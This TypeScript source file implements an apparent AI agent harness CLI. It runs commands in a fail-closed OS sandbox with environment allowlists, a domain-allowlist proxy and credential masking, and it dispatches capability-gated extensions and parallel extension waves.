/** The fixed parent runtime ceiling (ms) a `--max-runtime-ms` request is bounded by. */
const EXEC_PARENT_REMAINING_MS = 60_000;
/** The default per-command runtime reservation (ms) when `--max-runtime-ms` is omitted. */
const EXEC_DEFAULT_RUNTIME_MS = 30_000;
/** A sensible default output byte cap the contained run is measured against. */
const EXEC_OUTPUT_LIMIT_BYTES = 1_000_000;

interface ParsedExecArgs {
  allowEnvKeys: string[];
  maxRuntimeMs?: number;
  allowRealSubprocess: boolean;
  /** `--allowed-domains a,b,c` ⇒ restricted network via the loopback proxy. */
  allowedDomains?: string[];
  /** `--mask-env NAME@host[,host]` (repeatable) ⇒ credential masking. */
  maskEnv: string[];
  /** `--tls-terminate` ⇒ MITM allowlisted HTTPS (required for HTTPS masking). */
  tlsTerminate: boolean;
  /**
   * `--mask-mode auto|manual|off` or `--auto-mask` (alias for auto).
   * When unset, resolver uses KERYX_SANDBOX_MASK_MODE (P0.b built-in default: auto).
   */
  maskMode?: MaskMode;
  /** Set when `--mask-mode` received an invalid value. */
  maskModeError?: string;
  commandPath: string;
  commandArgs: string[];
}

/**
 * Why a run is restricted — the domain of the question, written down.
 *
 * This exists because it was previously read off `maskHosts.length > 0`, and
 * that number answers a DIFFERENT question. Inject hosts are derived from masks,
 * masks are resolved against `envWithSavedApiKeys`, and that includes every
 * provider key saved in the user-global `auth.json`. So the count meant both
 * "the operator asked for masking" and "a credential for some unrelated provider
 * happens to exist on this machine" — and the second reading silently widened
 * `keryx harness exec` to a restricted run on macOS, and blocked it outright on
 * Linux, where `restricted` is refused.
 *
 * Restricting the network is an operator decision. Below is every way to make
 * it. A new way to ask is a new union member, and the `switch` in
 * `describeRestriction` stops compiling until it is handled — which is the point
 * of writing the domain down rather than inferring it.
 */
export type NetworkRestrictionRequest =
  | { restricted: false }
  | {
      restricted: true;
      because:
        | "allowed-domains-flag"
        | "env-or-policy-domains"
        | "explicit-mask-spec"
        | "mask-mode-flag"
        | "tls-terminate-flag";
    };

/** The operator's intent, and nothing derived from the ambient environment. */
export interface NetworkRestrictionIntent {
  /** `--allowed-domains a,b`. An empty array is not a request. */
  allowedDomainsFlag: string[] | undefined;
  /** `KERYX_SANDBOX_ALLOWED_DOMAINS` or the project sandbox policy. */
  envOrPolicyDomains: string[] | undefined;
  /** `--mask-env NAME@host` specs, as typed. */
  explicitMaskSpecs: readonly string[];
  /** `--mask-mode <m>` / `--auto-mask`, present only when passed. */
  maskModeFlag: MaskMode | undefined;
  /** `--tls-terminate`. */
  tlsTerminateFlag: boolean;
}

/**
 * Answer whether the operator asked for a restricted-network run.
 *
 * Precedence is fixed so the reported reason is stable and a reader can tell
 * which request produced the posture. Ambient credentials are deliberately not
 * a parameter: they cannot reach this decision.
 */
export function resolveNetworkRestriction(
  intent: NetworkRestrictionIntent,
): NetworkRestrictionRequest {
  if (intent.allowedDomainsFlag !== undefined && intent.allowedDomainsFlag.length > 0) {
    return { restricted: true, because: "allowed-domains-flag" };
  }
  if (intent.envOrPolicyDomains !== undefined && intent.envOrPolicyDomains.length > 0) {
    return { restricted: true, because: "env-or-policy-domains" };
  }
  if (intent.explicitMaskSpecs.length > 0) {
    return { restricted: true, because: "explicit-mask-spec" };
  }
  // Passing the flag at all is a statement about masking, and masking only means
  // anything on a restricted run. `off` counts too: what `off` does to the masks
  // is the resolver's decision, not this function's — here we answer only who asked.
  if (intent.maskModeFlag !== undefined) {
    return { restricted: true, because: "mask-mode-flag" };
  }
  if (intent.tlsTerminateFlag) {
    return { restricted: true, because: "tls-terminate-flag" };
  }
  return { restricted: false };
}

/** Operator-facing wording for each way of asking. Total over the union. */
export function describeRestriction(request: NetworkRestrictionRequest): string {
  if (!request.restricted) return "not restricted";
  switch (request.because) {
    case "allowed-domains-flag":
      return "restricted by --allowed-domains";
    case "env-or-policy-domains":
      return "restricted by environment or project sandbox policy";
    case "explicit-mask-spec":
      return "restricted by --mask-env";
    case "mask-mode-flag":
      return "restricted by --mask-mode / --auto-mask";
    case "tls-terminate-flag":
      return "restricted by --tls-terminate";
  }
}

/** Parse `exec [--allow-env KEY]... [--max-runtime-ms N] [--allow-real-subprocess] -- <path> [args...]`. */
function parseExecArgs(args: string[]): ParsedExecArgs {
  const allowEnvKeys: string[] = [];
  let maxRuntimeMs: number | undefined;
  let allowRealSubprocess = false;
  let allowedDomains: string[] | undefined;
  const maskEnv: string[] = [];
  let tlsTerminate = false;
  let maskMode: MaskMode | undefined;
  let maskModeError: string | undefined;
  let commandPath = "";
  let commandArgs: string[] = [];

  // args[0] is the "exec" subcommand; scan flags until the `--` terminator.
  for (let i = 1; i < args.length; i++) {
    const arg = args[i];
    if (arg === "--") {
      commandPath = args[i + 1] ?? "";
      commandArgs = args.slice(i + 2);
      break;
    }
    if (arg === "--allow-env") {
      const key = args[++i];
      if (key !== undefined) allowEnvKeys.push(key);
    } else if (arg === "--max-runtime-ms") {
      const raw = args[++i];
      const parsed = raw === undefined ? Number.NaN : Number.parseInt(raw, 10);
      if (Number.isFinite(parsed)) maxRuntimeMs = parsed;
    } else if (arg === "--allow-real-subprocess") {
      allowRealSubprocess = true;
    } else if (arg === "--allowed-domains") {
      const raw = args[++i];
      if (raw !== undefined) {
        allowedDomains = raw.split(",").map((d) => d.trim()).filter((d) => d.length > 0);
      }
    } else if (arg === "--mask-env") {
      const raw = args[++i];
      if (raw !== undefined) maskEnv.push(raw);
    } else if (arg === "--tls-terminate") {
      tlsTerminate = true;
    } else if (arg === "--auto-mask") {
      maskMode = "auto";
    } else if (arg === "--mask-mode") {
      const raw = args[++i];
      if (raw !== undefined) {
        const parsedMode = parseMaskModeStrict(raw);
        if (parsedMode === undefined) {
          maskModeError = raw;
        } else {
          maskMode = parsedMode;
        }
      }
    }
  }

  const parsed: ParsedExecArgs = {
    allowEnvKeys,
    allowRealSubprocess,
    maskEnv,
    tlsTerminate,
    commandPath,
    commandArgs,
  };
  if (maxRuntimeMs !== undefined) parsed.maxRuntimeMs = maxRuntimeMs;
  if (allowedDomains !== undefined) parsed.allowedDomains = allowedDomains;
  if (maskMode !== undefined) parsed.maskMode = maskMode;
  if (maskModeError !== undefined) parsed.maskModeError = maskModeError;
  return parsed;
}

/**
 * `keryx harness exec` — run one command through the reused, fail-closed
 * `runContainedProcess` decision core. Offline+deterministic when a
 * `processAdapter` is injected; fail-closed refusal when neither an injected
 * adapter nor the `--allow-real-subprocess` (or `KERYX_ALLOW_REAL_SUBPROCESS=1`)
 * opt-in is present — no adapter is constructed and nothing is spawned. Prints
 * ONE JSON blob as its last `console.log`; NEVER persists flow state (D-02) and
 * never logs env values.
 */
async function harnessExec(args: string[], deps?: HarnessCommandDeps): Promise<void> {
  const { env, clock, idSeq } = resolveRuntime(deps);
  const parsedArgs = parseExecArgs(args);
  const {
    allowEnvKeys,
    maxRuntimeMs,
    allowRealSubprocess,
    allowedDomains,
    maskEnv,
    tlsTerminate,
    maskMode,
    maskModeError,
    commandPath,
    commandArgs,
  } = parsedArgs;

  /** Structured fail-closed outcome (machine-readable; no spawn). */
  const emitBlocked = (reason: string, sandbox?: { launcher?: string; detail?: string }): void => {
    const body: Record<string, unknown> = {
      outcome: { kind: "blocked", reason },
    };
    if (sandbox !== undefined) {
      body.sandbox = sandbox;
    }
    console.log(JSON.stringify(body));
  };

  if (maskModeError !== undefined) {
    emitBlocked(`invalid --mask-mode "${maskModeError}" (expected auto|manual|off)`);
    return;
  }

  // A missing `-- <path>` used to sail through as an empty command path and only
  // surface as an opaque exit 71 from the sandbox launcher failing to exec "".
  // Say what is actually wrong instead.
  if (deps?.processAdapter === undefined && commandPath.length === 0) {
    emitBlocked(
      "no command. Put the program after a `--` terminator, " +
        "e.g. `keryx harness exec --allow-real-subprocess -- /bin/echo hi`.",
    );
    return;
  }

  // Fail-closed opt-in gate: with no injected adapter and no explicit real-
  // subprocess authority, refuse BEFORE constructing any adapter or spawning.
  const allowReal = allowRealSubprocess || env.KERYX_ALLOW_REAL_SUBPROCESS === "1";
  if (deps?.processAdapter === undefined && !allowReal) {
    console.log(
      "keryx harness exec refuses to spawn a real subprocess without --allow-real-subprocess " +
        "(or KERYX_ALLOW_REAL_SUBPROCESS=1); no process was started.",
    );
    return;
  }

  const cwd = process.cwd();
  // Only the explicitly allowlisted env KEYS are forwarded, and only when they
  // resolve to a value; env VALUES are never logged (secret-safety).
  const commandEnv: Record<string, string> = {};
  for (const key of allowEnvKeys) {
    const value = env[key];
    if (value !== undefined) commandEnv[key] = value;
  }

  // Restricted-network opt-in: `--allowed-domains a,b`, env, or project policy
  // (P2). Starts the loopback allowlist proxy (worker), points the contained
  // command at it via HTTP(S)_PROXY, and constrains the OS sandbox to allow only
  // that loopback socket. Only for real (non-injected) runs.
  const policyDomains = resolveAllowedDomains(env, cwd);
  const envOrPolicyDomains = policyDomains.length > 0 ? policyDomains : undefined;

  // Credential masking via shared resolver (P0–P2). Keys from auth.json participate
  // in auto-mask (envWithSavedApiKeys); real values never logged. Prefer shared
  // resolveMasksFromSandboxEnv — no forked mask/TLS logic (ADR-0007 / AC-H7).
  const envForMask = envWithSavedApiKeys(env);
  const providers = buildDefaultMaskProviders(OPENAI_COMPAT_PROVIDERS);
  const maskResult = resolveMasksFromSandboxEnv({
    env: envForMask,
    extraExplicitSpecs: maskEnv,
    ...(maskMode !== undefined ? { modeOverride: maskMode } : {}),
    ...(tlsTerminate ? { tlsFlag: true } : {}),
    providers,
    projectRoot: cwd,
  });
  if (!maskResult.ok) {
    // AC-H1: non-empty masks without TLS (and other resolve failures) → blocked,
    // structured reason, no spawn.
    emitBlocked(maskResult.reason);
    return;
  }
  const masks: MaskedCredential[] = maskResult.resolution.masks.map((m) => ({
    name: m.name,
    realValue: (typeof envForMask[m.name] === "string" ? envForMask[m.name] : "") as string,
    injectHosts: m.injectHosts,
  }));
  const wantsTlsTerminate = maskResult.resolution.tlsTerminate;

  // SF-2. The posture is the OPERATOR's decision — see `resolveNetworkRestriction`.
  // This used to be `baseDomains === undefined && maskHosts.length === 0`, which
  // let a credential that merely EXISTS choose it.
  const restriction = resolveNetworkRestriction({
    allowedDomainsFlag: allowedDomains,
    envOrPolicyDomains,
    explicitMaskSpecs: maskEnv,
    maskModeFlag: maskMode,
    tlsTerminateFlag: tlsTerminate,
  });

  // Inject hosts must be reachable, so they join the allowlist — but only once a
  // restricted run has already been asked for. They never cause one.
  const maskHosts = masks.flatMap((m) => m.injectHosts);
  const baseDomains = allowedDomains ?? envOrPolicyDomains;
  const restrictedDomains = restriction.restricted
    ? [...new Set([...(baseDomains ?? []), ...maskHosts])]
    : undefined;

  let effectiveAllowEnvKeys = allowEnvKeys;
  let profileOverride: SandboxProfile | undefined;
  let closeNetwork: () => Promise<void> = async () => {};
  // Non-undefined only when the allowlist proxy actually ran, so the output can
  // distinguish "restricted, nothing connected" from "not restricted at all".
  let netDecisions: ProxyDecision[] | undefined;
  if (restrictedDomains !== undefined && deps?.processAdapter === undefined) {
    const baseProfile = defaultSandboxProfile(canonicalPath(cwd), canonicalPath(tmpdir()), homedir());
    const net = await setupNetworkRun(
      {
        ...baseProfile,
        network: "restricted",
        allowedDomains: restrictedDomains,
      },
      { ...(masks.length > 0 ? { masks } : {}), ...(wantsTlsTerminate ? { tlsTerminate: true } : {}) },
    );
    profileOverride = net.profile;
    closeNetwork = net.close;
    netDecisions = net.decisions;
    for (const [key, value] of Object.entries(net.envAdditions)) {
      commandEnv[key] = value;
    }
    effectiveAllowEnvKeys = [...allowEnvKeys, ...Object.keys(net.envAdditions)];
  }

  // Resolved once, before the run: the detectors are synchronous and pure, but
  // their config lives on disk, and the contained-process path must not reach
  // for the filesystem mid-run.
  const scanner = await buildHarnessScanner(cwd);

  const command: ContainedCommand = {
    path: commandPath,
    argv: [commandPath, ...commandArgs],
    env: commandEnv,
    cwd,
  };

  // The guard's traversal check is rooted at the command path's filesystem root
  // so an approved absolute system binary (e.g. /bin/echo) is in-root; the shell-
  // metachar / credential / env-allowlist gates remain the real containment.
  const worktreeRoot = path.parse(path.resolve(cwd, commandPath)).root || cwd;

  const budget: BudgetReservation = {
    reservationId: idSeq(),
    maxRuntimeMs: maxRuntimeMs ?? EXEC_DEFAULT_RUNTIME_MS,
  };
  const parentRemaining: ParentRemainingBudget = { maxRuntimeMs: EXEC_PARENT_REMAINING_MS };

  // Default (non-injected) real spawns are OS-contained: workspace-write
  // (writable = cwd + session tmp) + network OFF, fail-closed when the launcher
  // is missing. Set KERYX_DANGEROUSLY_DISABLE_SANDBOX=1 to opt out, or
  // KERYX_SANDBOX_ALLOW_UNSANDBOXED=1 to run unsandboxed when no launcher exists.
  const usingInjectedAdapter = deps?.processAdapter !== undefined;
  const adapter: ProcessAdapter =
    deps?.processAdapter ?? buildDefaultShellAdapter(cwd, env, profileOverride);
  // For diagnostics (AC-H2): name the platform launcher when we own the adapter.
  const sandboxLauncher =
    usingInjectedAdapter
      ? undefined
      : process.platform === "darwin"
        ? "seatbelt"
        : process.platform === "linux"
          ? "bwrap"
          : "none";

  const runInput: RunContainedProcessInput = {
    command,
    allowlist: {
      worktreeRoot,
      envAllowlist: effectiveAllowEnvKeys,
      profile: shellAllowProfile(),
      interactive: true,
      // `scanAvailable` is a FAIL-CLOSED signal: `guardAction` denies outright
      // when it is false. It was hardcoded `true` here, which meant the guard
      // could never fire — a safety catch pinned open. It now reports whether a
      // scanner is genuinely behind it, so a guarded mutation in a project with
      // security disabled is denied rather than waved through unscanned.
      scanAvailable: scanner.available,
      risk: "shell" satisfies ToolRisk,
    },
    budget,
    parentRemaining,
    outputLimitBytes: EXEC_OUTPUT_LIMIT_BYTES,
    adapter,
  };

  let output: Record<string, unknown>;
  try {
    const outcome = runContainedProcess(runInput, { clock, idSeq });
    if (outcome.kind === "completed") {
      const exitCode = outcome.exitCode;
      // Exit 71 (EX_OSERR) from a sandboxed run is usually launcher/helper failure
      // (non-executable path, missing binary) — surface structured detail so
      // operators do not mark UNKNOWN on bare 71 (AC-H2).
      const exit71Detail =
        exitCode === 71 && sandboxLauncher !== undefined && sandboxLauncher !== "none"
          ? "sandbox or OS reported exit 71 (EX_OSERR): often missing/non-executable helper, path denied inside the sandbox, or launcher failure"
          : undefined;
      output = {
        outcome: {
          kind: "completed",
          ...(exitCode !== undefined ? { exitCode } : {}),
          ...(exit71Detail !== undefined ? { reason: exit71Detail } : {}),
        },
        receipt: outcome.receipt,
        evidenceRefs: outcome.evidenceRefs,
        ...(exit71Detail !== undefined && sandboxLauncher !== undefined
          ? {
              sandbox: {
                launcher: sandboxLauncher,
                detail: exit71Detail,
              },
            }
          : sandboxLauncher !== undefined
            ? { sandbox: { launcher: sandboxLauncher } }
            : {}),
      };
    } else if (outcome.kind === "blocked") {
      output = {
        outcome: { kind: "blocked", reason: outcome.reason },
        ...(sandboxLauncher !== undefined
          ? {
              sandbox: {
                launcher: sandboxLauncher,
                detail: outcome.reason,
              },
            }
          : {}),
      };
    } else {
      output = {
        outcome: { kind: outcome.kind },
        receipt: outcome.receipt,
        ...(sandboxLauncher !== undefined ? { sandbox: { launcher: sandboxLauncher } } : {}),
      };
    }
  } finally {
    // Always tear down the proxy worker, even if the run threw.
    await closeNetwork();
  }

  // Surface what the network allowlist actually did. Without this a blocked host
  // reaches the caller only as an opaque connection error from inside the
  // contained process, with no way to tell "the sandbox denied it" from "the
  // host is down". Collected AFTER close() so every ruling has been delivered.
  if (netDecisions !== undefined) {
    output.network = {
      restricted: true,
      allowedDomains: restrictedDomains ?? [],
      decisions: summarizeDecisions(netDecisions),
    };
  }
  console.log(JSON.stringify(output));
}

// ---------------------------------------------------------------------------
// extension — a single registered+granted extension dispatch, spec-driven.
// ---------------------------------------------------------------------------

/** Read a spec from `--spec <path>` (real CLI path only; tests inject the spec). */
function readSpecArg<T>(args: string[]): T {
  let specPath: string | undefined;
  for (let i = 1; i < args.length; i++) {
    if (args[i] === "--spec") {
      specPath = args[i + 1];
      break;
    }
  }
  if (specPath === undefined) {
    throw new Error("keryx harness: a --spec <path> argument is required when no spec is injected.");
  }
  return JSON.parse(readFileSync(specPath, "utf8")) as T;
}

/** The default STATUS-first child reply parsed when the spec supplies none. */
const DEFAULT_CHILD_RESULT = "STATUS: DONE\nExtension completed within its granted capabilities.";

/**
 * `keryx harness extension` — register, (optionally) evaluate an escalation
 * grant, then dispatch a single extension, all via the reused R2 library.
 * Fail-closed: an unregistered spec prints `{registration}` with NO dispatch; a
 * denied escalation prints `{registration, grantEvaluation}` with NO dispatch.
 * Prints ONE JSON blob; NEVER persists flow state (D-02).
 */
function harnessExtension(args: string[], deps?: HarnessCommandDeps): void {
  const { clock, idSeq } = resolveRuntime(deps);
  const spec = deps?.extensionSpec ?? readSpecArg<ExtensionCliSpec>(args);

  const registration = registerExtension({
    extensionId: spec.extensionId,
    ...(spec.manifest !== undefined ? { manifest: spec.manifest } : {}),
    ...(spec.capabilityGrant !== undefined ? { capabilityGrant: spec.capabilityGrant } : {}),
  });
  if (!registration.ok) {
    console.log(JSON.stringify({ registration }));
    return;
  }

  // Only when the spec REQUESTS capabilities do we run the escalation gate; a
  // denial is fail-closed BEFORE any dispatch is built.
  if (spec.requestedCapabilities !== undefined) {
    const grantEvaluation = evaluateExtensionGrant(
      {
        grantedCapabilities: spec.capabilityGrant?.capabilities ?? [],
        requestedCapabilities: spec.requestedCapabilities,
        ...(spec.policyDecision !== undefined ? { policyDecision: spec.policyDecision } : {}),
        ...(spec.provenance !== undefined ? { provenance: spec.provenance } : {}),
        ...(spec.approval !== undefined ? { approval: spec.approval } : {}),
      },
      { checkApproval },
    );
    if (!grantEvaluation.ok) {
      console.log(JSON.stringify({ registration, grantEvaluation }));
      return;
    }
  }

  // capabilityGrant is present here (registration.ok proved it non-empty).
  const capabilityGrant = spec.capabilityGrant as CapabilityGrant;
  const dispatchInput: DispatchExtensionInput = {
    registration,
    capabilityGrant,
    reservedBudget: spec.reservedBudget,
    parentRunId: spec.parentRunId,
    sessionId: spec.sessionId,
    attempt: spec.attempt,
    branchId: spec.branchId,
    contextManifestHash: spec.contextManifestHash,
    policyFingerprint: spec.policyFingerprint,
    canonicalContractVersion: spec.canonicalContractVersion,
    task: spec.task,
    acceptanceCriteria: spec.acceptanceCriteria,
    dispatchArtifact: spec.dispatchArtifact,
    resultArtifact: spec.resultArtifact,
  };
  const dispatch = dispatchExtension(dispatchInput, { idSeq, clock });
  if (!dispatch.ok) {
    console.log(JSON.stringify({ registration, dispatch }));
    return;
  }

  const parsed = dispatch.parseResult(spec.rawChildResult ?? DEFAULT_CHILD_RESULT);
  console.log(
    JSON.stringify({
      registration,
      dispatch: dispatch.dispatch,
      result: parsed.canonical,
      evidenceRefs: [spec.resultArtifact.hash],
    }),
  );
}

// ---------------------------------------------------------------------------
// wave — a bounded parallel wave of registered extensions, spec-driven.
// ---------------------------------------------------------------------------

/**
 * `keryx harness wave` — register each task, assemble `ExtensionWaveTask[]`, and
 * plan bounded parallel waves via the reused `planExtensionWave`. Prints
 * `{ok:true, waves}` or `{ok:false, reason}` (propagated verbatim from the
 * planner). NEVER persists flow state (D-02).
 */
function harnessWave(args: string[], deps?: HarnessCommandDeps): void {
  const { clock, idSeq } = resolveRuntime(deps);
  const spec = deps?.waveSpec ?? readSpecArg<WaveCliSpec>(args);

  const tasks: ExtensionWaveTask[] = spec.tasks.map((task) => {
    const registration = registerExtension({
      extensionId: task.extensionId,
      ...(task.manifest !== undefined ? { manifest: task.manifest } : {}),
      ...(task.capabilityGrant !== undefined ? { capabilityGrant: task.capabilityGrant } : {}),
    });
    // A placeholder grant only ever survives for an UNREGISTERED task, which
    // `planExtensionWave` denies (fail-closed) before it is ever dispatched.
    const capabilityGrant: CapabilityGrant =
      task.capabilityGrant ?? { grantId: "", capabilities: [] };
    return {
      taskId: task.taskId,
      dependsOn: task.dependsOn,
      registration,
      capabilityGrant,
      budgetRequest: task.budgetRequest,
      ...(task.cancelled !== undefined ? { cancelled: task.cancelled } : {}),
      sessionId: task.sessionId,
      attempt: task.attempt,
      branchId: task.branchId,
      contextManifestHash: task.contextManifestHash,
      policyFingerprint: task.policyFingerprint,
      task: task.task,
      acceptanceCriteria: task.acceptanceCriteria,
      dispatchArtifact: task.dispatchArtifact,
      resultArtifact: task.resultArtifact,
    };
  });

  const planInput: PlanExtensionWaveInput = {
    tasks,
    config: { maxConcurrency: spec.maxConcurrency, parentRemaining: spec.parentRemaining },
    parentRunId: spec.parentRunId,
    canonicalContractVersion: spec.canonicalContractVersion,
  };
  const plan = planExtensionWave(planInput, { idSeq, clock });
  if (plan.ok) {
    console.log(JSON.stringify({ ok: true, waves: plan.waves }));
  } else {
    console.log(JSON.stringify({ ok: false, reason: plan.reason }));
  }
}
